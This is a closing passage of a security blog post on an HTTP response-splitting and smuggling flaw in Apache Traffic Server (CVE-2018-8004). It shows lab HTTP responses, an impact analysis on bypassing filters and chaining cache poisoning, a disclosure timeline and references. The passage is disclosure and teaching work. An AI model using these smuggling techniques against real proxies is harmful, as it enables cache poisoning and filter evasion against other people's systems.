Query for `/victim.html` (should be a 404 in our example) gets response for `/index.html` (`X-Location-echo: /index.html?evil=cogip2000`).

{% highlight http %}
HTTP/1.1 200 OK
Server: ATS/7.1.1
Date: Fri, 26 Oct 2018 16:05:41 GMT
Content-Type: text/html
Content-Length: 120
Last-Modified: Fri, 26 Oct 2018 14:16:28 GMT
ETag: "5bd321bc-78"
X-Location-echo: /index.html?cache=cogip2000
X-Default-VH: 0
Cache-Control: public, max-age=300
Accept-Ranges: bytes
Age: 12

$<html><head><title>Nginx default static page</title></head>
<body><h1>Hello World</h1>
<p>It works!</p>
</body></html>
{% endhighlight %}
{% highlight http %}
HTTP/1.1 200 OK
Server: ATS/7.1.1
Date: Fri, 26 Oct 2018 16:05:53 GMT
Content-Type: text/html
Content-Length: 120
Last-Modified: Fri, 26 Oct 2018 14:16:28 GMT
ETag: "5bd321bc-78"
X-Location-echo: /index.html?evil=cogip2000
X-Default-VH: 0
Cache-Control: public, max-age=300
Accept-Ranges: bytes
Age: 0

$<html><head><title>Nginx default static page</title></head>
<body><h1>Hello World</h1>
<p>It works!</p>
</body></html>
{% endhighlight %}

Here the issue is **critical**, especially because **there is not invalid syntax in the attacking query**.

We have an HTTP response splitting, this means two main impacts:

* ATS may be used to poison or hurt an actor used in front of it
* the second query is hidden (that's a body, binary garbage for an http actor), so any security filter set in front of ATS
 cannot block the 2nd query. We could use that to hide a second layer of attack
 like an ATS cache poisoning as described in the other attacks. Now that you have a working lab you can try embedding several layers of attacks...

That's what the **Drain the request body if there is a cache hit** fix is about.

Just to better understand *real world impacts*, here the only one receiving response B instead of C is the attacker. HaProxy is not a cache, so the mix C-request/B-response on HaProxy is not a real direct threat. But if there is a cache in front of HaProxy, or if we use several chained ATS proxies...

## Timeline

* 2017-12-26: Reports to project maintainers
* 2018-01-08: Acknowledgment by project maintainers
* 2018-04-16: Version 7.1.3 with most of the fix
* 2018-08-04: Versions 7.1.4 and 6.2.2 (officially containing all fixs, and some other CVE fixs)
* 2018-08-28: [CVE announce][ANNOUNCE]
* 2019-10-17: This article

## See also

* Video [Defcon 24: HTTP Smuggling](https://www.youtube.com/watch?v=dVU9i5PsMPY)
* [Defcon support](https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEFCON-24-Regilero-Hiding-Wookiees-In-Http.pdf)
* Video [Defcon demos](https://www.youtube.com/watch?v=lY_Mf2Fv7kI)

  [FRENCH]: https://www.makina-corpus.com/blog/metier/2018/securite-contrebande-de-http-apache-traffic-server
  [SHODAN]: https://www.shodan.io/search?query=Server%3A+ATS
  [ATS]: http://trafficserver.apache.org/
  [CVE]: https://nvd.nist.gov/vuln/detail/CVE-2018-8004
  [CVE_2016_8743]: https://nvd.nist.gov/vuln/detail/CVE-2016-8743
  [PULL_REQUEST_3192]: https://github.com/apache/trafficserver/pull/3192
  [PULL_REQUEST_3201]: https://github.com/apache/trafficserver/pull/3201
  [PULL_REQUEST_3231]: https://github.com/apache/trafficserver/pull/3231
  [PULL_REQUEST_3251]: https://github.com/apache/trafficserver/pull/3251
  [RFC7230_3_3_2]: https://tools.ietf.org/html/rfc7230#section-3.3.2
  [RFC7230_3_3_3]: https://tools.ietf.org/html/rfc7230#section-3.3.3
  [RFC7230_3_2_4]: https://tools.ietf.org/html/rfc7230#section-3.2.4
  [HAPROXY]: https://www.haproxy.org/
  [NGINX_ISSUE]: https://trac.nginx.org/nginx/ticket/1014
  [ANNOUNCE]: https://lists.apache.org/thread.html/7df882eb09029a4460768a61f88a30c9c30c9dc88e9bcc6e19ba24d5@%3Cusers.trafficserver.apache.org%3E
  [PREVIOUS_DETAILS]: https://regilero.github.io/security/english/2015/10/04/http_smuggling_in_2015_part_one/#toc4
  [ALBINOWAX]: https://twitter.com/albinowax
  [DESYNC]: https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn
  [BURP]: https://portswigger.net/burp/communitydownload